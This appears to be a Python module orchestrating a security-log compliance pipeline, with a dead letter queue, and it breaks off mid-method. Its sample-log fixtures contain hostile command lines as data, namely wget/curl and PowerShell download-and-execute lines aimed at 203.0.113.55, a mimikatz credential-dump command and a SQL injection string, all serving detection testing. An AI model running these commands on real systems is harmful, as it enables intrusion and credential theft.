"""
pipeline.py
===========
Orchestration layer for the Furix deterministic compliance pipeline.

Live log entries are loaded from LOG_INPUT_PATH (config.py) via
log_ingest.load_logs_from_file() — one log entry per line, log_type
auto-detected per line by log_ingest.detect_log_type(). SAMPLE_LOGS below
is kept only as a fixture/smoke-test fallback, not the run's data source.

run_full_pipeline() is the main entry point:
  Phase 0  : Threat density assessment
  Phase 1  : Deterministic analysis (Gemma off critical path)
  Phase 1d : CIS mapping correction (keyword engine, authoritative)
  Phase 1e : Severity correction
  Phase 3  : Policy evaluation (14 signal-based compliance rules)
  Phase 2  : RAG retrieval

DeadLetterQueue handles failures: attempt_1 -> retry -> manual_review.
All three queues are persisted to disk as JSON on every write.
"""

import os, re, json, sys, time
import threading
from datetime import datetime, timezone

from config import OUTPUT_DIR, LOG_INPUT_PATH, SEVERITY_ORDER, SEVERITY_FLOOR, BENIGN_SEVERITY_CEILING
from db_connections import CIS_TO_NIST_MAPPINGS, HIPAA_TO_NIST_MAPPINGS
from detection_engine import (
    analyze_log_with_llm, validate_and_correct_cis_mapping,
    compute_threat_density, post_llm_severity_correction,
    get_benign_severity, apply_benign_suppression,
    STRUCTURED_RISK_LOG_TYPES,
)
from retrieval_engine import retrieve_cis_controls_llm
from models import embedder, reranker
from policy_engine import evaluate_policy
from log_ingest import load_logs_from_file


def _aggregate_compliance_mapping(findings: dict, policy_findings: list, rag_results: list) -> dict:
    """
    Single consolidated view of every CIS/NIST/HIPAA citation produced by a
    pipeline run — previously scattered across findings.cis_controls_mapping,
    each policy_findings[*].nist_csf_ids/hipaa_cfr, and the per-chunk metadata
    inside rag_results.

    cis_controls    : the authoritative CIS mapping from Phase 1d (Control 6, ...)
    nist_identifiers: union of every NIST CSF subcategory cited by a fired
                      policy rule AND every NIST subcategory RAG actually
                      retrieved evidence for (CIS chunks carry graph-derived
                      NIST mappings; NIST chunks carry their own ID).
    hipaa_citations : union of every HIPAA CFR section cited by a fired
                      policy rule AND every HIPAA CFR section RAG retrieved
                      evidence for.
    """
    cis_controls = set(findings.get("cis_controls_mapping", {}).get("control_ids", []))

    nist_ids        = set()
    hipaa_citations = set()

    for pf in policy_findings:
        nist_ids.update(pf.get("nist_csf_ids", []) or [])
        if pf.get("hipaa_cfr"):
            hipaa_citations.add(pf["hipaa_cfr"])

    for _score, _doc, meta in rag_results:
        for entry in (meta.get("nist_mappings") or []):
            nist_id = entry[0] if isinstance(entry, (list, tuple)) else entry
            if nist_id:
                nist_ids.add(nist_id)
        if meta.get("framework_id") == "hipaa_security_rule" and meta.get("control_id"):
            hipaa_citations.add(meta["control_id"])

    def _cis_sort_key(ctrl: str):
        m = re.search(r'\d+', ctrl)
        return (int(m.group()) if m else 0, ctrl)

    return {
        "cis_controls":     sorted(cis_controls, key=_cis_sort_key),
        "nist_identifiers": sorted(nist_ids),
        "hipaa_citations":  sorted(hipaa_citations),
    }

SAMPLE_LOGS = {

"nmap": """
Nmap scan report for 172.16.40.50
Host is up (0.045s latency).
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9
80/tcp   open  http          Apache httpd 2.4.41
443/tcp  open  https
| http-vuln-cve2024-21410:
|   VULNERABLE:
|   Microsoft Exchange Server Elevation of Privilege Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2024-21410
|_    Action: Apply mitigations per vendor instructions (BOD 22-01).
3389/tcp open  ms-wbt-server Microsoft Terminal Services
445/tcp  open  microsoft-ds  Windows Server 2019
""".strip(),

"syslog": """
May  6 08:12:01 web-srv01 sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2
May  6 08:12:05 web-srv01 sshd[1234]: Failed password for invalid user root from 192.168.1.100 port 54323 ssh2
May  6 08:15:33 web-srv01 sudo[5678]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
May  6 08:16:01 web-srv01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.55 DST=10.0.0.1 PROTO=TCP DPT=445
May  6 08:17:10 web-srv01 apache2[9012]: [error] [client 203.0.113.55] ModSecurity: Access denied -- Rule 942100 SQL Injection detected in ARGS:id
May  6 08:18:22 web-srv01 kernel: CVE-2026-31431 privilege escalation attempt detected via kernel subsystem
May  6 08:20:01 web-srv01 cron[1111]: (root) CMD (/usr/bin/wget -q http://203.0.113.55/payload.sh -O /tmp/payload.sh && bash /tmp/payload.sh)
May  6 08:20:05 web-srv01 auditd[2222]: type=EXECVE msg=audit(1746504005.123:456): argc=3 a0="curl" a1="-s" a2="http://203.0.113.55/c2"
""".strip(),

"windows_evtx": """
EventID: 4625 | Account For Which Logon Failed: admin | Failure Reason: Unknown user name or bad password | Source Network Address: 10.10.5.22 | Logon Type: 3
EventID: 4672 | Special privileges assigned to new logon | Account Name: svc_backup | Privileges: SeBackupPrivilege SeRestorePrivilege
EventID: 4720 | A user account was created | New Account Name: backdoor_user | Created By: Administrator
EventID: 4732 | A member was added to a security-enabled local group | Group Name: Administrators | Member: backdoor_user
EventID: 7045 | A new service was installed | Service Name: EvilSvc | Service File: C:\\Windows\\Temp\\evil.exe
EventID: 4688 | A new process has been created | Process: C:\\Users\\victim\\AppData\\Local\\Temp\\mimikatz.exe | Creator: svchost.exe
EventID: 4698 | A scheduled task was created | Task Name: PersistenceTask | Task Content: powershell -enc JAB...
""".strip(),

"cloudtrail": """
{"eventVersion":"1.08","eventName":"ConsoleLogin","eventSource":"signin.amazonaws.com","sourceIPAddress":"45.33.32.156","userAgent":"Mozilla/5.0","responseElements":{"ConsoleLogin":"Success"},"additionalEventData":{"MFAUsed":"No","LoginTo":"https://console.aws.amazon.com"}}
{"eventName":"DeleteBucket","eventSource":"s3.amazonaws.com","requestParameters":{"bucketName":"prod-backup-2024"},"sourceIPAddress":"45.33.32.156","userIdentity":{"type":"IAMUser","userName":"contractor01"}}
{"eventName":"CreateUser","eventSource":"iam.amazonaws.com","requestParameters":{"userName":"backdoor_admin"},"sourceIPAddress":"45.33.32.156"}
{"eventName":"AttachUserPolicy","eventSource":"iam.amazonaws.com","requestParameters":{"policyArn":"arn:aws:iam::aws:policy/AdministratorAccess","userName":"backdoor_admin"},"sourceIPAddress":"45.33.32.156"}
{"eventName":"GetSecretValue","eventSource":"secretsmanager.amazonaws.com","requestParameters":{"secretId":"prod/db/password"},"sourceIPAddress":"45.33.32.156"}
""".strip(),

"o365": """
{"CreationTime":"2024-05-06T08:10:00","Operation":"UserLoggedIn","UserId":"admin@corp.com","ClientIP":"45.33.32.156","ResultStatus":"Succeeded","LogonError":"","AuthenticationMethod":"Password","IsManagedDevice":false}
{"CreationTime":"2024-05-06T08:12:00","Operation":"Add member to role.","UserId":"admin@corp.com","ObjectId":"backdoor@corp.com","ModifiedProperties":[{"Name":"Role.WellKnownObjectName","NewValue":"GlobalAdmin"}]}
{"CreationTime":"2024-05-06T08:14:00","Operation":"Set-TransportRule","UserId":"admin@corp.com","Parameters":[{"Name":"RedirectMessageTo","Value":"attacker@external.com"},{"Name":"FromScope","Value":"InOrganization"}]}
{"CreationTime":"2024-05-06T08:16:00","Operation":"FileDownloaded","UserId":"admin@corp.com","SourceFileName":"sensitive_employee_data.xlsx","SiteUrl":"https://corp.sharepoint.com/sites/HR"}
""".strip(),

# ── Azure AD / Entra ID ───────────────────────────────────────────────────────
"azure_ad": """
{"time":"2024-05-06T08:10:00Z","operationName":"Sign-in activity","resultType":"0","resultDescription":"Success","userPrincipalName":"admin@corp.onmicrosoft.com","ipAddress":"45.33.32.156","clientAppUsed":"Browser","conditionalAccessStatus":"notApplied","authenticationRequirement":"singleFactorAuthentication","riskState":"atRisk","riskLevelAggregated":"high","location":{"city":"Moscow","countryOrRegion":"RU"}}
{"time":"2024-05-06T08:12:00Z","operationName":"Add member to role","resultType":"0","initiatedBy":{"user":{"userPrincipalName":"admin@corp.onmicrosoft.com"}},"targetResources":[{"userPrincipalName":"attacker@corp.onmicrosoft.com","modifiedProperties":[{"displayName":"Role.DisplayName","newValue":"Global Administrator"}]}]}
{"time":"2024-05-06T08:14:00Z","operationName":"Update conditional access policy","resultType":"0","initiatedBy":{"user":{"userPrincipalName":"admin@corp.onmicrosoft.com"}},"targetResources":[{"displayName":"Block Legacy Authentication","modifiedProperties":[{"displayName":"State","oldValue":"enabled","newValue":"disabled"}]}]}
{"time":"2024-05-06T08:16:00Z","operationName":"Add OAuth2PermissionGrant","resultType":"0","initiatedBy":{"user":{"userPrincipalName":"admin@corp.onmicrosoft.com"}},"targetResources":[{"displayName":"malicious-app","type":"ServicePrincipal"}]}
""".strip(),

# ── Wazuh SIEM ────────────────────────────────────────────────────────────────
"wazuh_siem": """
{"timestamp":"2024-05-06T08:10:00+0000","rule":{"id":"5710","level":10,"description":"sshd: Attempt to login using a non-existent user","groups":["syslog","sshd","authentication_failed"]},"agent":{"id":"001","name":"web-server-01"},"data":{"srcip":"203.0.113.55","srcport":"54321","srcuser":"admin"},"full_log":"May 6 08:10:00 web-server-01 sshd[1234]: Invalid user admin from 203.0.113.55"}
{"timestamp":"2024-05-06T08:11:00+0000","rule":{"id":"5712","level":10,"description":"sshd: brute force trying to get access to the system","groups":["syslog","sshd","authentication_failures"]},"agent":{"id":"001","name":"web-server-01"},"data":{"srcip":"203.0.113.55","srcuser":"root"},"full_log":"May 6 08:11:00 web-server-01 sshd[1234]: Failed password for root from 203.0.113.55"}
{"timestamp":"2024-05-06T08:15:00+0000","rule":{"id":"550","level":7,"description":"Integrity checksum changed","groups":["ossec","syscheck","syscheck_entry_modified"]},"agent":{"id":"001","name":"web-server-01"},"syscheck":{"path":"/etc/passwd","event":"modified","sha256_after":"abc123","sha256_before":"def456"}}
{"timestamp":"2024-05-06T08:20:00+0000","rule":{"id":"31108","level":12,"description":"Web attack: SQL injection attempt","groups":["web","accesslog","attack"]},"agent":{"id":"001","name":"web-server-01"},"data":{"srcip":"203.0.113.55","url":"/login.php?id=1'OR'1'='1","method":"GET"}}
""".strip(),

# ── GCP Audit Log ─────────────────────────────────────────────────────────────
"gcp_audit": """
{"logName":"projects/corp-prod/logs/cloudaudit.googleapis.com%2Factivity","timestamp":"2024-05-06T08:10:00Z","severity":"NOTICE","protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","methodName":"google.iam.admin.v1.CreateServiceAccount","authenticationInfo":{"principalEmail":"admin@corp.com"},"requestMetadata":{"callerIp":"45.33.32.156"},"request":{"accountId":"backdoor-sa","serviceAccount":{"displayName":"backdoor service account"}}}}
{"logName":"projects/corp-prod/logs/cloudaudit.googleapis.com%2Factivity","timestamp":"2024-05-06T08:12:00Z","severity":"NOTICE","protoPayload":{"methodName":"google.iam.admin.v1.SetIamPolicy","authenticationInfo":{"principalEmail":"admin@corp.com"},"requestMetadata":{"callerIp":"45.33.32.156"},"serviceData":{"policyDelta":{"bindingDeltas":[{"action":"ADD","role":"roles/owner","member":"serviceAccount:backdoor-sa@corp-prod.iam.gserviceaccount.com"}]}}}}
{"logName":"projects/corp-prod/logs/cloudaudit.googleapis.com%2Factivity","timestamp":"2024-05-06T08:14:00Z","severity":"NOTICE","protoPayload":{"methodName":"storage.buckets.getIamPolicy","authenticationInfo":{"principalEmail":"backdoor-sa@corp-prod.iam.gserviceaccount.com"},"requestMetadata":{"callerIp":"45.33.32.156"},"resourceName":"projects/_/buckets/corp-prod-backups"}}
{"logName":"projects/corp-prod/logs/cloudaudit.googleapis.com%2Factivity","timestamp":"2024-05-06T08:16:00Z","severity":"NOTICE","protoPayload":{"methodName":"storage.objects.list","authenticationInfo":{"principalEmail":"backdoor-sa@corp-prod.iam.gserviceaccount.com"},"requestMetadata":{"callerIp":"45.33.32.156"},"resourceName":"projects/_/buckets/corp-prod-backups"}}
""".strip(),

# ── Microsoft Defender ATP ────────────────────────────────────────────────────
"microsoft_defender": """
{"Timestamp":"2024-05-06T08:20:00Z","AlertId":"da637921234567890_-123456789","Title":"Suspicious PowerShell command line","Category":"Malware","Severity":"High","ServiceSource":"Microsoft Defender for Endpoint","DetectionSource":"EDR","DeviceName":"WORKSTATION01","FileName":"powershell.exe","ProcessCommandLine":"powershell -exec bypass -c IEX(New-Object Net.WebClient).downloadString('http://203.0.113.55/payload.ps1')","SHA1":"abc123","RemoteUrl":"http://203.0.113.55/payload.ps1","CVE":"CVE-2024-21412","MitreTechniques":"T1059.001,T1105","RecommendedActions":"Isolate device, collect investigation package"}
{"Timestamp":"2024-05-06T08:21:00Z","AlertId":"da637921234567890_-123456790","Title":"Mimikatz credential dumping tool detected","Category":"CredentialAccess","Severity":"Critical","ServiceSource":"Microsoft Defender for Endpoint","DetectionSource":"AV","DeviceName":"WORKSTATION01","FileName":"mimikatz.exe","ProcessCommandLine":"mimikatz.exe sekurlsa::logonpasswords","SHA1":"def456","MitreTechniques":"T1003.001","RecommendedActions":"Isolate device immediately, reset all credentials"}
{"Timestamp":"2024-05-06T08:22:00Z","AlertId":"da637921234567890_-123456791","Title":"Ransomware behavior detected","Category":"Ransomware","Severity":"Critical","ServiceSource":"Microsoft Defender for Endpoint","DeviceName":"WORKSTATION01","FileName":"encrypt.exe","FolderPath":"C:\\\\Users\\\\Public","MitreTechniques":"T1486","RecommendedActions":"Isolate device, initiate incident response"}
""".strip(),

# ── Okta SSO / Identity ───────────────────────────────────────────────────────
"okta_sso": """
{"published":"2024-05-06T08:10:00Z","eventType":"user.session.start","outcome":{"result":"SUCCESS"},"client":{"ipAddress":"45.33.32.156","geographicalContext":{"country":"Russia","city":"Moscow"},"userAgent":{"rawUserAgent":"python-requests/2.28.0"}},"actor":{"alternateId":"admin@corp.com","type":"User"},"debugContext":{"debugData":{"requestUri":"/api/v1/authn","threatSuspected":"true"}}}
{"published":"2024-05-06T08:11:00Z","eventType":"policy.evaluate_sign_on","outcome":{"result":"ALLOW"},"actor":{"alternateId":"admin@corp.com"},"debugContext":{"debugData":{"factor":"OKTA_VERIFY","mfaAttempted":"false","behaviors":{"New Geo-Location":"POSITIVE","New Device":"POSITIVE","New IP":"POSITIVE","Velocity":"POSITIVE"}}}}
{"published":"2024-05-06T08:12:00Z","eventType":"user.mfa.factor.deactivate","outcome":{"result":"SUCCESS"},"actor":{"alternateId":"admin@corp.com","type":"User"},"target":[{"alternateId":"victim@corp.com","type":"User","detailEntry":{"methodTypeUsed":"OKTA_VERIFY"}}]}
{"published":"2024-05-06T08:14:00Z","eventType":"application.provision.user","outcome":{"result":"SUCCESS"},"actor":{"alternateId":"admin@corp.com"},"target":[{"alternateId":"backdoor@corp.com","type":"AppUser","displayName":"Backdoor Account"}],"client":{"ipAddress":"45.33.32.156"}}
{"published":"2024-05-06T08:16:00Z","eventType":"user.account.privilege.grant","outcome":{"result":"SUCCESS"},"actor":{"alternateId":"admin@corp.com"},"target":[{"alternateId":"backdoor@corp.com","type":"User"}],"debugContext":{"debugData":{"privilegeGranted":"Super Administrator"}}}
""".strip(),
 }


def run_full_pipeline(raw_log: str, log_type: str = "auto") -> dict:
    sep = "#" * 72

    # ── Input validation — guard before any processing ────────────────────────
    if raw_log is None:
        return {
            "findings": {}, "investigation_query": "", "rag_results": [],
            "raw_log_reference": {}, "_query_fallback_used": False,
            "_density": {}, "_parse_error": "Input was None",
            "_failure_stage": "input_validation", "_log_type": log_type,
        }
    if not isinstance(raw_log, str):
        try:
            raw_log = str(raw_log)
        except Exception as e:
            return {
                "findings": {}, "investigation_query": "", "rag_results": [],
                "raw_log_reference": {}, "_query_fallback_used": False,
                "_density": {}, "_parse_error": f"Input could not be converted to string: {e}",
                "_failure_stage": "input_validation", "_log_type": log_type,
            }
    if not raw_log.strip():
        return {
            "findings": {}, "investigation_query": "", "rag_results": [],
            "raw_log_reference": {}, "_query_fallback_used": False,
            "_density": {}, "_parse_error": "Input was empty or whitespace only",
            "_failure_stage": "input_validation", "_log_type": log_type,
        }
    if len(raw_log) > 500_000:
        raw_log = raw_log[:500_000]
        print(f"  [input_validation] Log truncated to 500,000 chars (was {len(raw_log)} chars)")

    # ── Per-phase timing setup ────────────────────────────────────────────────
    # Single source of truth for every timestamp/duration this run produces —
    # populated incrementally and returned as one "timing" block, instead of
    # being scattered across _phase_timings / _total_elapsed_sec / a RAG
    # breakdown that used to only ever be printed, never returned.
    _run_timestamp  = datetime.now(timezone.utc).isoformat()
    _pipeline_start = time.perf_counter()
    phase_timings = {}

    # ── Phase 0: Threat density assessment ───────────────────────────────────
    _t0 = time.perf_counter()
    try:
        density = compute_threat_density(raw_log, log_type=log_type)
        print(f"\n{sep}")
        print(f"  PHASE 0 — THREAT DENSITY GATE  |  log_type: {log_type.upper()}")
        print(f"{sep}")
        print(f"  Threat hits      : {density['threat_hits']}")
        print(f"  Benign hits      : {density['benign_hits']}")
        print(f"  Net score        : {density['net_score']}")
        print(f"  Is benign        : {density['is_benign']}")
        print(f"  Structured risk  : {density['is_structured_risk']}")
        if density["matched_threats"]:
            print(f"  Threats matched  : {density['matched_threats'][:5]}")
    except Exception as e:
        print(f"  [Phase 0 ERROR] Threat density failed: {e} — using safe defaults")
        density = {
            "threat_hits": 0, "benign_hits": 0, "threat_score": 0.0,
            "benign_score": 0.0, "net_score": 0.0, "is_benign": False,
            "is_structured_risk": False, "matched_threats": [],
        }
    phase_timings["phase_0_threat_density"] = round(time.perf_counter() - _t0, 4)

    # ── Phase 1a–1c: Deterministic analysis (Phase 2 — Gemma off critical path) ──
    # enrich_with_llm=False: deterministic path only (all 25 known log types).
    # enrich_with_llm=True:  only set by DLQ retry for unknown/unstructured formats.
    _is_unknown_format = log_type.lower() in ("auto", "generic", "unknown")
    _t1 = time.perf_counter()
    try:
        llm_result = analyze_log_with_llm(
            raw_log,
            verbose=True,
            log_type=log_type,
            enrich_with_llm=_is_unknown_format,
        )
    except Exception as e:
        print(f"  [Phase 1 ERROR] Deterministic analysis failed: {e}")
        phase_timings["phase_1_det_analysis"] = round(time.perf_counter() - _t1, 4)
        return {
            "findings": {}, "investigation_query": "", "rag_results": [],
            "raw_log_reference": {}, "_query_fallback_used": False,
            "_density": density, "_parse_error": str(e),
            "_failure_stage": "det_analysis", "_log_type": log_type,
            "compliance_mapping": {"cis_controls": [], "nist_identifiers": [], "hipaa_citations": []},
            "timing": {
                "run_timestamp":     _run_timestamp,
                "phase_timings":     phase_timings,
                "rag_timings":       {},
                "total_elapsed_sec": round(time.perf_counter() - _pipeline_start, 4),
            },
        }
    phase_timings["phase_1_det_analysis"] = round(time.perf_counter() - _t1, 4)
    findings            = llm_result["findings"]
    investigation_query = llm_result["investigation_query"]

    # ── Phase 1d: CIS validator / corrector ──────────────────────────────────
    _t2 = time.perf_counter()
    try:
        findings = validate_and_correct_cis_mapping(
            findings=findings, raw_log=raw_log, verbose=True, log_type=log_type
        )
    except Exception as e:
        print(f"  [Phase 1d ERROR] CIS validator failed: {e} — using unvalidated findings")
    phase_timings["phase_1d_cis_mapping"] = round(time.perf_counter() - _t2, 4)

    # ── Phase 1e-NEW: Post-LLM content-aware severity correction ─────────────
    _t3 = time.perf_counter()
    try:
        findings = post_llm_severity_correction(findings, raw_log, log_type)
    except Exception as e:
        print(f"  [Phase 1e ERROR] Severity correction failed: {e} — keeping LLM severity")
    phase_timings["phase_1e_post_llm_severity"] = round(time.perf_counter() - _t3, 4)

    # ── Phase 1e: Density-based severity correction ───────────────────────────
    _t4 = time.perf_counter()
    try:
        if density["is_benign"]:
            original_sev  = findings.get("severity", "low")
            corrected_sev = get_benign_severity(density, log_type=log_type)
            if original_sev in ("medium", "high", "critical"):
                findings["severity"] = corrected_sev
                print(f"\n  [density_gate] Severity corrected: "
                      f"{original_sev.upper()} → {corrected_sev.upper()} "
                      f"(benign log, net_score={density['net_score']})")
        elif density["is_structured_risk"]:
            floor = SEVERITY_FLOOR.get(log_type.lower())
            if floor:
                current_sev = findings.get("severity", "low")
                if (current_sev in SEVERITY_ORDER and floor in SEVERITY_ORDER and
                        SEVERITY_ORDER.index(current_sev) < SEVERITY_ORDER.index(floor)):
                    findings["severity"] = floor
                    print(f"\n  [severity_floor] {log_type}: "
                          f"{current_sev.upper()} → {floor.upper()} (floor applied)")
    except Exception as e:
        print(f"  [Phase 1e ERROR] Density severity gate failed: {e} — keeping current severity")
    phase_timings["phase_1e_density_severity"] = round(time.perf_counter() - _t4, 4)

    # ── Phase 1e continued: Benign control suppression ───────────────────────
    _t5 = time.perf_counter()
    try:
        findings = apply_benign_suppression(findings, log_type, density)
    except Exception as e:
        print(f"  [Phase 1e ERROR] Benign suppression failed: {e} — skipping suppression")
    phase_timings["phase_1e_benign_suppression"] = round(time.perf_counter() - _t5, 4)

    # ── Phase 3: Policy evaluation ────────────────────────────────────────────
    # Runs after all findings and severity corrections are final.
    # Produces structured PolicyFinding objects — one per rule that fires.
    # Never modifies findings, severity, or rag_results.
    # policy_findings: list of dicts (one per violation)
    # policy_summary:  metadata dict (rules evaluated, controls clean vs violated)
    _t6 = time.perf_counter()
    try:
        policy_findings, policy_summary = evaluate_policy(
        findings,
        raw_log,
        is_benign=density.get("is_benign", False),
        )
    except Exception as e:
        print(f"  [Phase 3 ERROR] Policy evaluation failed: {e}")
        policy_findings = []
        policy_summary  = {
            "rules_evaluated": 0, "violations_found": 0,
            "rules_fired": [], "controls_violated": [],
            "controls_evaluated_clean": [], "log_severity": findings.get("severity", "unknown"),
            "scf_version": "2026.1", "_error": str(e),
        }
    phase_timings["phase_3_policy_evaluation"] = round(time.perf_counter() - _t6, 4)

    # ── Phase 2: RAG retrieval ────────────────────────────────────────────────
    _t7 = time.perf_counter()
    try:
        rag_results, rag_timings = retrieve_cis_controls_llm(
            embedder=embedder,
            reranker=reranker,
            findings=findings,
            investigation_query=investigation_query,
            log_type=log_type,
            density=density,
        )
    except Exception as e:
        print(f"  [Phase 2 ERROR] RAG retrieval failed: {e}")
        phase_timings["phase_2_rag_retrieval"] = round(time.perf_counter() - _t7, 4)
        return {
            "findings":             findings,
            "investigation_query":  investigation_query,
            "raw_log_reference":    llm_result.get("raw_log_reference", {}),
            "rag_results":          [],
            "policy_findings":      policy_findings,
            "policy_summary":       policy_summary,
            "compliance_mapping":   _aggregate_compliance_mapping(findings, policy_findings, []),
            "_query_fallback_used": llm_result.get("_query_fallback_used", False),
            "_density":             density,
            "_parse_error":         str(e),
            "_failure_stage":       "rag_retrieval",
            "_log_type":            log_type,
            "timing": {
                "run_timestamp":     _run_timestamp,
                "phase_timings":     phase_timings,
                "rag_timings":       {},
                "total_elapsed_sec": round(time.perf_counter() - _pipeline_start, 4),
            },
        }

    phase_timings["phase_2_rag_retrieval"] = round(time.perf_counter() - _t7, 4)

    # ── Single consolidated summary — compliance mapping directly above runtime ──
    # Previously the CIS/NIST/HIPAA lists were never printed at all (only ever
    # returned), and timing was printed in two disconnected places (a RAG-stage
    # breakdown inside retrieve_cis_controls_llm, and a separate per-phase block
    # inside complete_log_pipeline_run). Both are now folded into one block,
    # printed once, right here.
    compliance_mapping = _aggregate_compliance_mapping(findings, policy_findings, rag_results)
    _total_elapsed_sec = round(time.perf_counter() - _pipeline_start, 4)

    print(f"\n{sep}")
    print(f"  COMPLIANCE MAPPING  |  log_type: {log_type.upper()}")
    print(f"{sep}")
    print(f"  CIS Controls     : {compliance_mapping['cis_controls']}")
    print(f"  NIST Identifiers : {compliance_mapping['nist_identifiers']}")
    print(f"  HIPAA Citations  : {compliance_mapping['hipaa_citations']}")
    print(f"\n  RUNTIME")
    print(f"  {'-' * 68}")
    print(f"  Run timestamp    : {_run_timestamp}")
    for _pname, _psec in phase_timings.items():
        print(f"  {_pname:<32} {_psec:>8.4f}s")
    for _rname, _rsec in rag_timings.items():
        print(f"      └─ rag.{_rname:<26} {_rsec:>8.4f}s")
    print(f"  {'-' * 68}")
    print(f"  TOTAL elapsed    : {_total_elapsed_sec:.4f}s")
    print(f"{sep}\n")

    return {
            "findings":             findings,
            "investigation_query":  investigation_query,
            "raw_log_reference":    llm_result.get("raw_log_reference", {}),
            "rag_results":          rag_results,
            "policy_findings":      policy_findings,
            "policy_summary":       policy_summary,
            "compliance_mapping":   compliance_mapping,
            "_query_fallback_used": llm_result.get("_query_fallback_used", False),
            "_density":             density,
            "_failure_stage":       None,
            "_log_type":            log_type,
            "timing": {
                "run_timestamp":     _run_timestamp,
                "phase_timings":     phase_timings,
                "rag_timings":       rag_timings,
                "total_elapsed_sec": _total_elapsed_sec,
            },
        }

print("   Phase 0: log_type passed to density gate")
print("   Phase 1e: severity floor applied for structured-risk log types")
print("   Zeek/VPN/DHCP/Cisco ASA will no longer be downgraded to informational")

# %%
# Quick test — first entry from the live log file through the full pipeline.
# Falls back to the syslog sample if the file is missing/empty (e.g. first
# setup on a fresh box before LOG_INPUT_PATH has been populated).
# GUARDED: only runs as a script, never on `import pipeline` — the API imports
# run_full_pipeline and must not trigger a heavy per-log run at import time.
if __name__ == "__main__":
    _smoke_test_entries = load_logs_from_file(LOG_INPUT_PATH)
    if _smoke_test_entries:
        _smoke_log_type, _smoke_raw_log = _smoke_test_entries[0]
        test_result = run_full_pipeline(_smoke_raw_log, log_type=_smoke_log_type)
    else:
        test_result = run_full_pipeline(SAMPLE_LOGS["syslog"], log_type="syslog")

# %%
# ─────────────────────────────────────────────────────────────────────────────
# DEAD LETTER QUEUE
# ─────────────────────────────────────────────────────────────────────────────
# Architecture:
#   attempt_1_queue  — logs that failed their first run through the pipeline
#   attempt_2_queue  — logs that failed their retry run
#   manual_review    — logs that failed both runs; saved for a human expert
#
# Each entry carries: original log, log_type, error, failure_stage, timestamp
# All three queues are persisted to disk as JSON so a kernel crash loses nothing


import json
import threading
from datetime import datetime, timezone

DLQ_DIR = os.path.join(OUTPUT_DIR, "dlq")
# Best-effort at import so `import pipeline` never crashes on an unwritable
# default OUTPUT_DIR (e.g. importing off-server). The DLQ save path recreates
# the directory on demand when a real run needs it.
try:
    os.makedirs(DLQ_DIR, exist_ok=True)
except OSError as _e:
    print(f"⚠️  DLQ dir not created at import ({DLQ_DIR}): {_e}")

DLQ_ATTEMPT1_PATH      = os.path.join(DLQ_DIR, "attempt_1_queue.json")
DLQ_ATTEMPT2_PATH      = os.path.join(DLQ_DIR, "attempt_2_queue.json")
DLQ_MANUAL_REVIEW_PATH = os.path.join(DLQ_DIR, "manual_review_queue.json")


# ─────────────────────────────────────────────────────────────────────────────
# DLQ HELPER — load / save JSON files safely
# ─────────────────────────────────────────────────────────────────────────────

def _dlq_load(path: str) -> list:
    """Load a DLQ file. Returns empty list if file missing or corrupt."""
    try:
        with open(path, "r") as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except (FileNotFoundError, json.JSONDecodeError):
        return []


def _dlq_save(path: str, entries: list) -> None:
    """Atomically write entries to a DLQ file."""
    os.makedirs(os.path.dirname(path), exist_ok=True)  # self-heal if import-time mkdir was skipped
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump(entries, f, indent=2, default=str)
    os.replace(tmp, path)


# ─────────────────────────────────────────────────────────────────────────────
# DeadLetterQueue CLASS
# ─────────────────────────────────────────────────────────────────────────────

class DeadLetterQueue:
    """
    Thread-safe Dead Letter Queue for the compliance pipeline.

    Flow:
        First failure  → attempt_1_queue  (will be retried once)
        Retry failure  → attempt_2_queue  → manual_review_queue
        Clean retry    → removed from queue, result returned normally

    All queues are persisted to disk on every write so nothing is lost
    if the notebook kernel crashes between runs.
    """

    def __init__(self):
        self._lock           = threading.Lock()
        self.attempt_1_queue = _dlq_load(DLQ_ATTEMPT1_PATH)
        self.attempt_2_queue = _dlq_load(DLQ_ATTEMPT2_PATH)
        self.manual_review   = _dlq_load(DLQ_MANUAL_REVIEW_PATH)
        print(f"✅ DeadLetterQueue initialised")
        print(f"   attempt_1_queue  : {len(self.attempt_1_queue)} entries (loaded from disk)")
        print(f"   attempt_2_queue  : {len(self.attempt_2_queue)} entries (loaded from disk)")
        print(f"   manual_review    : {len(self.manual_review)} entries (loaded from disk)")

    # ── Internal helpers ──────────────────────────────────────────────────────

    def _make_entry(self, raw_log, log_type: str, result: dict,
                    attempt: int, extra_note: str = "") -> dict:
        """Build a DLQ entry dict from a failed pipeline result."""
        return {
            "log_type":      log_type,
            "raw_log":       raw_log if isinstance(raw_log, str) else str(raw_log),
            "failure_stage": result.get("_failure_stage", "unknown"),
            "parse_error":   result.get("_parse_error",   "unknown"),
            "attempt":       attempt,
            "timestamp":     datetime.now(timezone.utc).isoformat(),
            "note":          extra_note,
            # Preserve whatever partial findings were recovered
            "partial_findings":        result.get("findings",            {}),
            "partial_investigation_q": result.get("investigation_query", ""),
        }

    def _is_failure(self, result: dict) -> bool:
        """
        A result is a DLQ candidate if:
          - _failure_stage is set and not None, OR
          - findings is empty (total pipeline failure)
        """
        stage = result.get("_failure_stage")
        return (stage is not None) or (not result.get("findings"))

    def _save_all(self) -> None:
        """Persist all three queues to disk. Call inside lock."""
        _dlq_save(DLQ_ATTEMPT1_PATH,      self.attempt_1_queue)
        _dlq_save(DLQ_ATTEMPT2_PATH,      self.attempt_2_queue)
        _dlq_save(DLQ_MANUAL_REVIEW_PATH, self.manual_review)

    # ── Public API ────────────────────────────────────────────────────────────

    def submit(self, raw_log, log_type: str, result: dict,
               note: str = "") -> None:
        """
        Call this when run_full_pipeline() returns a failure result.
        Adds the entry to attempt_1_queue and persists to disk.
        """
        if not self._is_failure(result):
            return  # clean result — nothing to queue

        entry = self._make_entry(raw_log, log_type, result, attempt=1, extra_note=note)
        with self._lock:
            self.attempt_1_queue.append(entry)
            self._save_all()
        print(f"  [DLQ] Queued for retry → {log_type} "
              f"(stage: {entry['failure_stage']}, "
              f"attempt_1_queue size: {len(self.attempt_1_queue)})")

    def retry_all(self) -> dict:
        """
